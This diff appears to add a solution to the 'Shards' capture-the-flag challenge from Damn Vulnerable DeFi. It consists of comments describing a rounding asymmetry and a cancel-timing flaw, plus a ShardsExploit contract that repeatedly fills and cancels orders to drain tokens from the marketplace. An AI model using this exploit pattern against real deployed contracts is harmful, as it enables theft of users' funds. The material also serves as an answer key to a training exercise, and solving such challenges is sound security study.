@@ -114,7 +114,15 @@ contract ShardsChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_shards() public checkSolvedByPlayer {
-        
+        // Bug: fill() payment rounding divides by totalShards (10^25),
+        // so buying want ≤ 133 pays 0 DVT. cancel() refund math does NOT
+        // divide by totalShards — it pays `want * rate / 1e6` back. That
+        // asymmetry lets us fill-then-cancel to net DVT out of the marketplace.
+        // cancel() timing bug: the require reverts only when now > ts+1d OR
+        // now > ts+2d, so same-block cancel is allowed (no waiting enforced).
+        // Drain via a helper that loops fill(1) + cancel repeatedly until we
+        // clear the threshold (initialTokensInMarketplace / 10000).
+        new ShardsExploit(marketplace, token, recovery);
     }
 
     /**
@@ -134,5 +142,34 @@ contract ShardsChallenge is Test {
 
         // Player must have executed a single transaction
         assertEq(vm.getNonce(player), 1);
+    }
+}
+
+contract ShardsExploit {
+    constructor(ShardsNFTMarketplace marketplace, DamnValuableToken token, address recovery) {
+        // Each iteration: want=100 units → paid=0 (rounds down), refund≈7.5e12 units.
+        // Need to drain > initialTokensInMarketplace / 10000.
+        uint256 initial = token.balanceOf(address(marketplace));
+        uint256 threshold = initial / 10_000 + 1;
+
+        // Gas-efficient: single fill with max want that keeps paid=0
+        // paid = want * price * rate / (1e6 * totalShards), rounds down.
+        // With price=1e12, rate=75e15, totalShards=1e25, divisor = 10^25 / (10^12 * 75e15 / 10^6) = 10^25/75e21 ≈ 133.
+        // So want <= 133 → paid = 0.
+        uint256 want = 100;
+        uint256 refundPerIter = want * 75e15 / 1e6; // 7.5e12 per iteration
+
+        uint256 iters = (threshold + refundPerIter - 1) / refundPerIter + 10;
+
+        // Batch: do all fills, then all cancels (offer stays open because stock >> want)
+        for (uint256 i = 0; i < iters; i++) {
+            marketplace.fill(1, want);
+        }
+        for (uint256 i = 0; i < iters; i++) {
+            marketplace.cancel(1, i);
+        }
+
+        // Forward everything to recovery
+        token.transfer(recovery, token.balanceOf(address(this)));
     }
 }
